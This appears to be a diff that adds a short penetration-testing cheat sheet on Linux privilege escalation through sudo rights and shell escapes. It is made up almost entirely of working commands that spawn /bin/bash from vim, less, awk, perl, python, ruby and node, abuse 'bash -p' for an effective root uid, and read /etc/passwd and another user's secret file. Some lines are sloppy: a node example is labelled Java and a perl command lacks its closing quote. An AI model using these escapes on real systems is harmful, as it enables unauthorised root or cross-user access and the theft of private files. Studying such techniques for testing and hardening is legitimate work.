@@ -1,0 +1,55 @@
+Checking the rights:
+- sudo -l
+
+Using another user:
+- sudo -u username '/bin/bash' (example)
+
+1. Using VIM editor: 
+
+- Reading the file can be done directly by specifying the file's path on the command line after the command or by opening the 
+file inside vim (using :r [PATH]).
+- To gain a shell as the user victim, you can start vim then you can type the following: :!/bin/bash to run /bin/bash
+
+2. Using Bash:
+- bash -p
+- bash-3.2# id
+- uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)
+
+3. Using LESS:
+- less /etc/passwd
+- !/bin/bash
+
+4. Using AWK
+Getting shell access:
+- awk 'BEGIN {system("/bin/bash")}'
+
+Reading the file can be done by specifying the path of the file in the command line:
+- awk '{print $1}' /home/xxx/xxx.txt
+
+5. Using perl (as another user)
+- sudo -u username perl -e 'system("/bin/bash")
+
+6. Using PYTHON (as another user)
+- -c 'import socket,subprocess,os;p=subprocess.call(["/bin/sh","-i"]);'
+
+- xxxxxxx:~$ sudo -u username python
+>>> from subprocess import call
+>>> call('id')
+uid=1001(username) gid=1001(username) groups=1001(username)
+>>> call('/bin/bash')
+
+7. Using RUBY (as another user)
+- sudo -u username usr/bin/ruby -e 'require "irb" ; IRB.start(__FILE__)', 
+irb(main):005:0>`id`
+=> "uid=1001(username) gid=1001(username) groups=1001(username)\n"
+
+Running bash:
+- sudo ruby -e 'exec "/bin/bash"' (ruby)
+
+8. Using JAVA (as another user)
+- sudo -u victim node -e "var exec = require('child_process').exec;
+exec('[COMMAND]', function (error, stdOut, stdErr) {
+console.log(stdOut);
+});"
+
+[COMMAND] - for e.g. to read the file: cat /home/username/secret.txt
